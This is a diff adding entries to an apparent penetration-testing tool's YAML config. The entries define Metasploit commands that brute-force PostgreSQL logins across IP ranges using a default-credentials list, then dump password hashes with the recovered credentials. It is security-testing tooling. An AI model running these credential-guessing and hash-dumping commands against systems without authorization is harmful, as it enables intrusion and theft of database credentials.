@@ -95,3 +95,18 @@
       :iterate_replacer: ip
       :defaults:
         :file: files/SecLists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt
+    - :name: metasploit
+      :command:  msfconsole -x "use auxiliary/scanner/postgres/postgres_login; set RHOSTS %{ip};run"
+      :priority: 5
+      :iterate_mode: multi_pass
+      :iterate_over: range
+      :iterate_replacer: ip
+- :protocol: POSTGRESQL
+  :name: Dump hashes
+  :techniques:
+    - :name: metasploit
+      :command:  msfconsole -x "use auxiliary/scanner/postgres/postgres_hashdump; set RHOSTS %{ip}; set USERNAME %{username}; set PASSWORD %{password};run"
+      :priority: 5
+      :iterate_mode: multi_pass
+      :iterate_over: range
+      :iterate_replacer: ip
